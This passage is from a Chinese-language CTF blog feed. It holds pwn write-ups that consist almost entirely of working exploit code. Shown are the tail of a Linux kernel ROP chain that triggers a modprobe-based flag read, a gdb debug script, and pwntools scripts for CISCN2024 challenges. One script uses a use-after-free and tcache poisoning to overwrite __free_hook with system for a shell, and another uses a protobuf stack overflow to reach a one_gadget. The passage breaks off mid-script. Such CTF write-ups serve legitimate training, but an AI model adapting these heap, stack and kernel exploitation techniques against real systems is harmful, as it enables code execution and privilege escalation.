class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span><span class="token number">0x36</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span>modprobe_getflag<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> j<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> j<span class="token operator">&lt;</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span> j<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">char</span><span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token operator">+</span>j<span class="token punctuation">)</span> <span class="token operator">^=</span> <span class="token number">0xf9</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">strcpy</span><span class="token punctuation">(</span>buf<span class="token operator">+</span><span class="token number">0x20</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">ioctl</span><span class="token punctuation">(</span>fd<span class="token punctuation">,</span> CMD_WRITE<span class="token punctuation">,</span> buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/EXP_FILE/c7853eaab2a7f09c4eb4a8fe4a2f3804_MD5.jpeg"></p><p>动调脚本</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#!/bin/bash</span>gdb <span class="token parameter variable">-q</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">""</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"file ./vmlinux"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"set \<span class="token variable">$kobase</span> = 0xffffffffc0068000"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"add-symbol-file ./rootfs/lib/modules/5.10.0-9-generic/kernel/test.ko \<span class="token variable">$kobase</span> "</span><span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"target remote localhost:1234"</span> <span class="token punctuation">\</span><span class="token parameter variable">-ex</span> <span class="token string">"b *(\<span class="token variable">$kobase</span>+0x0000000000000282)"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="Emoji：暂存"><a href="#Emoji：暂存" class="headerlink" title="Emoji：暂存"></a>Emoji：暂存</h1>]]></content>
      
      
      <categories>
          
          <category> CTFpwn </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 赛题 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CISCN2024华中赛区选拔赛</title>
      <link href="/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/"/>
      <url>/2024/06/21/CISCN2024%E5%8D%8E%E4%B8%AD%E8%B5%9B%E5%8C%BA%E9%80%89%E6%8B%94%E8%B5%9B/</url>
      
        <content type="html"><![CDATA[<blockquote><p>入围决赛，不枉此行吧</p></blockquote><p><img src="/EXP_FILE/a93659a4e81aa611ef0c9e7fa4bcc640_MD5.jpeg"><br><img src="/EXP_FILE/080007363601715580c7f21bb36ab8c9_MD5.jpeg"></p><h1 id="note"><a href="#note" class="headerlink" title="note"></a>note</h1><p>2.31 UAF，tcache 打__free_hook即可</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">menu</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">:</span>sa<span class="token punctuation">(</span><span class="token string">'5. exit'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>num<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>size<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">edit</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> content<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'The size of your content: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span>content<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">delete</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>menu<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span>sa<span class="token punctuation">(</span><span class="token string">'index: '</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>add<span class="token punctuation">(</span><span class="token number">0x410</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'/bin/sh\x00'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>ru<span class="token punctuation">(</span><span class="token string">'Content: '</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>u64<span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x1ecbe0</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>free_hook<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'__free_hook'</span><span class="token punctuation">)</span>system<span class="token operator">=</span>ls<span class="token punctuation">(</span><span class="token string">'system'</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>free_hook<span class="token punctuation">)</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span><span class="token string">b'aaaa'</span><span class="token punctuation">)</span>add<span class="token punctuation">(</span><span class="token number">0x10</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span><span class="token punctuation">)</span>delete<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">''</span><span class="token punctuation">)</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>elf<span class="token punctuation">.</span>libc<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>ls   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span>data<span class="token punctuation">]</span>itr  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>ic   <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>pt   <span class="token operator">=</span> <span class="token keyword">lambda</span> s<span class="token punctuation">:</span>log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m %s --- %s \033[0m'</span> <span class="token operator">%</span> <span class="token punctuation">(</span>s<span class="token punctuation">,</span><span class="token builtin">type</span><span class="token punctuation">(</span><span class="token builtin">eval</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>lg   <span class="token operator">=</span> <span class="token keyword">lambda</span> name<span class="token punctuation">,</span>addr <span class="token punctuation">:</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'\033[1;31;40m&#123;&#125; ==> &#123;:#x&#125;\033[0m'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span> addr<span class="token punctuation">)</span><span class="token punctuation">)</span>pwn<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>至于patch，我直接把 free 这条代码删除了<br><img src="/EXP_FILE/799389c69a658f8d66246317506c0518_MD5.jpeg"></p><h1 id="protoverflow"><a href="#protoverflow" class="headerlink" title="protoverflow"></a>protoverflow</h1><p>就是一个protobuf的序列化，栈溢出，我直接打的one_gadget</p><pre class="line-numbers language-protobuf" data-language="protobuf"><code class="language-protobuf"><span class="token keyword">syntax</span> <span class="token operator">=</span> <span class="token string">"proto2"</span><span class="token punctuation">;</span><span class="token keyword">message</span> <span class="token class-name">protoMessage</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> name <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token keyword">optional</span> <span class="token builtin">string</span> phoneNumber <span class="token operator">=</span> <span class="token number">2</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">bytes</span> buffer <span class="token operator">=</span> <span class="token number">3</span><span class="token punctuation">;</span>    <span class="token keyword">required</span> <span class="token builtin">uint32</span> size <span class="token operator">=</span> <span class="token number">4</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token comment">#@Author:X1NRI</span><span class="token keyword">import</span> sys<span class="token keyword">import</span> os<span class="token keyword">import</span> message_pb2<span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span><span class="token keyword">from</span> ctypes <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment">#from LibcSearcher import LibcSearcher</span><span class="token keyword">def</span> <span class="token function">dbg</span><span class="token punctuation">(</span>command<span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#dbg(None)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span>gdbscript<span class="token operator">=</span>command<span class="token punctuation">)</span><span class="token comment">#pause()</span><span class="token comment">#------------------------------------------------------------------</span><span class="token keyword">def</span> <span class="token function">message</span><span class="token punctuation">(</span>name<span class="token punctuation">,</span>phoneNumber<span class="token punctuation">,</span><span class="token builtin">buffer</span><span class="token punctuation">,</span>size<span class="token punctuation">)</span><span class="token punctuation">:</span>msg<span class="token operator">=</span>message_pb2<span class="token punctuation">.</span>protoMessage<span class="token punctuation">(</span><span class="token punctuation">)</span>msg<span class="token punctuation">.</span>name<span class="token operator">=</span>namemsg<span class="token punctuation">.</span>phoneNumber<span class="token operator">=</span>phoneNumbermsg<span class="token punctuation">.</span><span class="token builtin">buffer</span><span class="token operator">=</span><span class="token builtin">buffer</span>msg<span class="token punctuation">.</span>size<span class="token operator">=</span>size<span class="token keyword">return</span> msg<span class="token punctuation">.</span>SerializeToString<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">pwn</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>ru<span class="token punctuation">(</span><span class="token string">'Gift: 0x'</span><span class="token punctuation">,</span><span class="token boolean">True</span><span class="token punctuation">)</span>puts<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">12</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>libc<span class="token punctuation">.</span>address<span class="token operator">=</span>puts<span class="token operator">-</span>ls<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'puts'</span><span class="token punctuation">,</span>puts<span class="token punctuation">)</span>lg<span class="token punctuation">(</span><span class="token string">'libc'</span><span class="token punctuation">,</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>one<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x4f2a5</span><span class="token punctuation">,</span><span class="token number">0x4f302</span><span class="token punctuation">,</span><span class="token number">0x10a2fc</span><span class="token punctuation">]</span>payload<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token number">0x210</span><span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span>dbg<span class="token punctuation">(</span><span class="token string">'b *$rebase(0x0000000000003344)'</span><span class="token punctuation">)</span>s<span class="token punctuation">(</span>message<span class="token punctuation">(</span><span class="token string">'xxx'</span><span class="token punctuation">,</span><span class="token string">'1234'</span><span class="token punctuation">,</span>payload<span class="token punctuation">,</span><span class="token number">0x300</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment">#dbg('')</span>itr<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span>arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span>bits<span class="token operator">=</span><span class="token number">64</span><span class="token punctuation">,</span>endian<span class="token operator">=</span><span class="token string">'little'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>terminal<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span><span class="token string">"splitw"</span><span class="token punctuation">,</span><span class="token string">"-h"</span><span class="token punctuation">,</span><span class="token string">"-l 100"</span><span class="token punctuation">]</span>binary<span class="token operator">=</span><span class="token string">'./pwn.patch'</span>context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>elf<span class="token operator">=</span>ELF<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">'./libc-2.27.so'</span><span class="token punctuation">)</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>io <span class="token operator">=</span> remote<span class="token punctuation">(</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span>sys<span class="token punctuation">.</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">else</span><span class="token punctuation">:</span>io <span class="token operator">=</span> process<span class="token punctuation">(</span>binary<span class="token punctuation">)</span>s  <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sl   <span class="token operator">=</span> <span class="token keyword">lambda</span> payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>sa   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>sla  <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>payload<span class="token punctuation">:</span>io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span>data<span class="token punctuation">,</span>payload<span class="token punctuation">)</span>r    <span class="token operator">=</span> <span class="token keyword">lambda</span> num      <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span>numb<span class="token operator">=</span>num<span class="token punctuation">)</span>ru   <span class="token operator">=</span> <span class="token keyword">lambda</span> data<span class="token punctuation">,</span>DROP<span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span>data<span class="token punctuation">,</span>drop<span class="token operator">=</span>DROP<span class="token punctuation">)</span>rl  <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>io<span class="token punctuation">.</span>recvline<span class="token punctuation">(</span>keepends<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>uu32 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u32<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\xf7'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">4</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span> uu64 <span class="token operator">=</span> <span class="token keyword">lambda</span>    <span class="token punctuation">:</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">b"\x00"</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>ep   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>plt<span class="token punctuation">[</span>data<span class="token punctuation">]</span>eg   <span class="token operator">=</span> <span class="token keyword">lambda</span> data <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span>data<span class="token punctuation">]</span>es   <span class="token operator">=</span> <span class="token keyword">lambda</span> data       <span class="token punctuation">:</span>elf<span class="token punctuation">.</span>sym<span class="token 